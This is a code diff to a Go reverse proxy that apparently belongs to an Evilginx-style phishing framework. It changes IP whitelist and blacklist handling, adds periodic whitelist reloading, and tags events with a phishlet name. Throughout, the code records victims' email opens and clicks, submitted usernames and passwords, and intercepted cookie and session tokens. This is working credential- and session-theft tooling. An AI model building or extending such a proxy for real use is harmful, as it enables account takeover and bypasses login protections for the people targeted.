@@ -213,14 +213,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			if p.cfg.GetBlacklistMode() != "off" {
-				if p.bl.IsBlacklisted(from_ip) {
-					if p.bl.IsVerbose() {
-						log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
+				if p.bl.IsWhitelisted(from_ip) {
+					// IP is whitelisted, allow through
+				} else {
+					if p.bl.IsBlacklisted(from_ip) {
+						if p.bl.IsVerbose() {
+							log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
+						}
+						return p.blockRequest(req)
 					}
-					return p.blockRequest(req)
-				}
-				if p.cfg.GetBlacklistMode() == "all" {
-					if !p.bl.IsWhitelisted(from_ip) {
+					if p.cfg.GetBlacklistMode() == "all" {
 						err := p.bl.AddIP(from_ip)
 						if p.bl.IsVerbose() {
 							if err != nil {
@@ -229,9 +231,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								log.Warning("blacklisted ip address: %s", from_ip)
 							}
 						}
+						return p.blockRequest(req)
 					}
-
-					return p.blockRequest(req)
 				}
 			}
 
@@ -425,7 +426,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												session.RId = rid
 												browser := map[string]string{"address": req.RemoteAddr, "orig-address": from_ip, "user-agent": req.UserAgent()}
 												session.Browser = browser
-												err := database.HandleEmailOpened(rid, browser, p.livefeed)
+												err := database.HandleEmailOpened(rid, browser, p.livefeed, pl_name)
 												if err != nil {
 													log.Error("failed to add email opened event to database: %s", err)
 												}
@@ -447,7 +448,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										session.RId = rid
 										browser := map[string]string{"address": req.RemoteAddr, "orig-address": from_ip, "user-agent": req.UserAgent()}
 										session.Browser = browser
-										err := database.HandleClickedLink(rid, browser, p.livefeed)
+										err := database.HandleClickedLink(rid, browser, p.livefeed, pl_name)
 										if err != nil {
 											log.Error("failed to add clicked link event to database: %s", err)
 										}
@@ -744,7 +745,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										log.Error("database: %v", err)
 									}
 									if len(session.RId) != 0 && len(session.Password) != 0 {
-										err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed)
+										err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed, pl.Name)
 										if err != nil {
 											fmt.Printf("Error submitting data to database: %s\n", err)
 										}
@@ -761,7 +762,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										log.Error("database: %v", err)
 									}
 									if len(session.RId) != 0 && len(session.Username) != 0 {
-										err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed)
+										err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed, pl.Name)
 										if err != nil {
 											fmt.Printf("Error submitting data to database: %s\n", err)
 										}
@@ -838,7 +839,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												log.Error("database: %v", err)
 											}
 											if len(session.RId) != 0 && len(session.Password) != 0 {
-												err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed)
+												err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed, pl.Name)
 												if err != nil {
 													fmt.Printf("Error submitting data to database: %s\n", err)
 												}
@@ -854,7 +855,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												log.Error("database: %v", err)
 											}
 											if len(session.RId) != 0 && len(session.Username) != 0 {
-												err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed)
+												err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed, pl.Name)
 												if err != nil {
 													fmt.Printf("Error submitting data to database: %s\n", err)
 												}
@@ -1142,7 +1143,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 						if err == nil {
 							if s.CookieTokens != nil && len(s.CookieTokens) > 0 {
-								err = database.HandleCapturedCookieSession(s.RId, s.CookieTokens, s.Browser, p.livefeed)
+								err = database.HandleCapturedCookieSession(s.RId, s.CookieTokens, s.Browser, p.livefeed, pl.Name)
 								if err != nil {
 									fmt.Printf("Error adding captured session entry to database: %s\n", err)
 								}
@@ -1153,7 +1154,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 						if err == nil {
 							if s.BodyTokens != nil && len(s.BodyTokens) > 0 {
-								err = database.HandleCapturedOtherSession(s.RId, s.BodyTokens, s.Browser, p.livefeed)
+								err = database.HandleCapturedOtherSession(s.RId, s.BodyTokens, s.Browser, p.livefeed, pl.Name)
 								if err != nil {
 									fmt.Printf("Error adding captured session entry to database: %s\n", err)
 								}
@@ -1164,7 +1165,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 						if err == nil {
 							if s.HttpTokens != nil && len(s.HttpTokens) > 0 {
-								err = database.HandleCapturedOtherSession(s.RId, s.HttpTokens, s.Browser, p.livefeed)
+								err = database.HandleCapturedOtherSession(s.RId, s.HttpTokens, s.Browser, p.livefeed, pl.Name)
 								if err != nil {
 									fmt.Printf("Error adding captured session entry to database: %s\n", err)
 								}
@@ -1295,7 +1296,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if s.CookieTokens != nil && len(s.CookieTokens) > 0 {
 									log.Success("[%d] detected authorization URL - cookie tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
 									if len(s.RId) != 0 {
-										err = database.HandleCapturedCookieSession(s.RId, s.CookieTokens, s.Browser, p.livefeed)
+										err = database.HandleCapturedCookieSession(s.RId, s.CookieTokens, s.Browser, p.livefeed, pl.Name)
 										if err != nil {
 											fmt.Printf("Error adding captured session entry to database: %s\n", err)
 										}
@@ -1310,7 +1311,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if s.BodyTokens != nil && len(s.BodyTokens) > 0 {
 									log.Success("[%d] detected authorization URL - body tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
 									if len(s.RId) != 0 {
-										err = database.HandleCapturedOtherSession(s.RId, s.BodyTokens, s.Browser, p.livefeed)
+										err = database.HandleCapturedOtherSession(s.RId, s.BodyTokens, s.Browser, p.livefeed, pl.Name)
 										if err != nil {
 											fmt.Printf("Error adding captured session entry to database: %s\n", err)
 										}
@@ -1325,7 +1326,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if s.HttpTokens != nil && len(s.HttpTokens) > 0 {
 									log.Success("[%d] detected authorization URL - HTTP tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
 									if len(s.RId) != 0 {
-										err = database.HandleCapturedOtherSession(s.RId, s.HttpTokens, s.Browser, p.livefeed)
+										err = database.HandleCapturedOtherSession(s.RId, s.HttpTokens, s.Browser, p.livefeed, pl.Name)
 										if err != nil {
 											fmt.Printf("Error adding captured session entry to database: %s\n", err)
 										}
@@ -2000,6 +2001,17 @@ func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
 
 func (p *HttpProxy) Start() error {
 	go p.httpsWorker()
+
+	// Periodically reload whitelist
+	go func() {
+		for {
+			time.Sleep(1 * time.Minute)
+			if p.bl != nil {
+				p.bl.ReloadWhitelist()
+			}
+		}
+	}()
+
 	return nil
 }
 
